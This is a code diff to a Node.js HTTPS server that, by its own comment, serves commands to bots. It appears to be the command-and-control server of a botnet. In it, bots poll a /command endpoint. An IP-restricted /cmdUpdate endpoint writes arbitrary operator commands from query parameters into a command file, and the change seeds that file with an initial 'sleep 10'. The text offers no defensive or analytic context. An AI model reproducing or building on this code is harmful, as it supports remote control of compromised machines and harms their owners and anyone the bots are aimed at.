@@ -68,7 +68,7 @@ server = https.createServer(https_options, app);
 // bots request commands from
 app.get('/command', function(req, res) {
   connectionInitialized(req, res);
-  fs.readFile('./admin/command', function(err, content) {
+  fs.readFile('command', function(err, content) {
     res.writeHead(200, { 'Content-Type': 'text/html' });
     res.end(content, 'utf-8');
   });
@@ -101,7 +101,7 @@ app.get('/cmdUpdate', function(req, res) {
   if (checkIP(req)) {
   var cmd = url.parse(req.url, true).query['cmd'];
   var vars = url.parse(req.url, true).query['vars'];
-  fs.createWriteStream("./admin/command").once('open', function() {
+  fs.createWriteStream("command").once('open', function() {
     this.write(cmd+' '+vars);
     this.end();
   });
@@ -120,6 +120,12 @@ socket.installHandlers(server, { prefix: '/websocket' })
 
 // serve static content from the /admin/ dir at /admin
 app.use('/admin/', express.static(path.join(__dirname, '/admin')));
+
+// initialize first command
+fs.createWriteStream("command").once('open', function() {
+    this.write('sleep 10');
+    this.end();
+  });
 
 server.listen(PORT, function() {
   console.log("Listening on port "+PORT+"....");
